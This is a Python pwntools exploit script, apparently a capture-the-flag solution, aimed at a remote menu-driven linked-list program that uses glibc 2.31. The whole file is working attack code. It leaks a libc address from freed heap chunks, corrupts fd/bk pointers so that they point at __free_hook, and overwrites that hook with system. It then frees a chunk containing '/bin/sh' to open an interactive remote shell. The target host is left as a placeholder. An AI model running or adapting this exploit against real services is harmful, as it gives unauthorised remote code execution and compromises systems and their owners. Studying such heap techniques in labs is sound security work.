from pwn import *

l = ELF("./libc-2.31.so", checksec=False)

HOST = "<insert targeted host here>"
PORT = 1234

r = remote(HOST, PORT)

def add_node(isPrev, nodeName, dataSize, nodeData):
    if(isPrev):
        r.sendlineafter("> ", "2")
    else:
        r.sendlineafter("> ", "1")
    r.sendlineafter("size : ", str(dataSize))
    r.sendafter("name : ", nodeName)
    r.sendafter("Data : ", nodeData)

def goto_node(isPrev):
    if(isPrev):
        r.sendlineafter("> ", "4")
    else:
        r.sendlineafter("> ", "3")

def delete_node(isPrev):
    if(isPrev):
        r.sendlineafter("> ", "6")
    else:
        r.sendlineafter("> ", "5")

def edit_node(nodeData):
    r.sendlineafter("> ", "7")
    r.sendafter("Data : ", nodeData)

def reset():
    r.sendlineafter("> ", "8")


def get_leak():
    r.recvuntil("node name : ")
    leak = r.recvline()[:-1].ljust(8, "\0")
    return u64(leak)

# leak libc address
for _ in range(8):
    add_node(0, 'A', 0x68, 'R'*0x68)

for _ in range(8):
    delete_node(1)

leak = get_leak()
print(hex(leak))
l.address = leak - 2014176

# overwrite bk & fd pointer
goto_node(0)
goto_node(1)

p = 'A'*112
p += p64(0x90)*2
p += p64(l.symbols['__free_hook'])*2
p += 'A'*120
p += p64(0x91)
p += p64(l.symbols['__free_hook'])*2
edit_node(p)

reset()

# make new node
for _ in range(6):
    add_node(0, '/bin/sh\x00', 0x68, "A")

# overwrite __free_hook
add_node(0, p64(l.symbols['system']), 0x68, 'A')

# call system("/bin/sh")
delete_node(1)

r.interactive()
